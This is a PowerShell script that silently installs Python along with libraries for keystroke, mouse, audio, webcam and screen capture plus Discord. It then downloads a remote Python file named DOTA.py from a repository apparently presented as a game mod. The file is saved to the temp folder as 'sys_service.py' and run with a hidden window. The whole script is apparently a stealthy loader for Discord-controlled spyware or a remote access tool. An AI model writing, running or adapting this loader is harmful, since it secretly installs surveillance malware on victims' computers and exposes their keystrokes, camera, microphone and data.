$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = 'SilentlyContinue'


$pyPath = "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe"
if (-not (Test-Path $pyPath)) {
    
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile "$env:TEMP\py_setup.exe"

   
    Start-Process -FilePath "$env:TEMP\py_setup.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_launcher=0" -Wait


    Remove-Item "$env:TEMP\py_setup.exe" -Force

    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")

    if (-not (Test-Path $pyPath)) {
        $pyPath = "python.exe" 
    }
} else {
}


$deps = "discord.py keyboard mouse psutil pyttsx3 requests pywin32 pycryptodome Pillow comtypes pycaw opencv-python"


& $pyPath -m pip install --upgrade pip -q


& $pyPath -m pip install $deps -q
& $pyPath -m pip install pyaudio -q
& $pyPath -m pip install pipwin -q
& $pyPath -m pipwin install pyaudio -q


$repoUrl = "https://github.com/ht-at/DOTAMOD/raw/refs/heads/main/DOTA.py"
$botPath = "$env:TEMP\sys_service.py"

Invoke-WebRequest -Uri $repoUrl -OutFile $botPath

Start-Process -FilePath $pyPath -ArgumentList "-W ignore `"$botPath`"" -WindowStyle Hidden
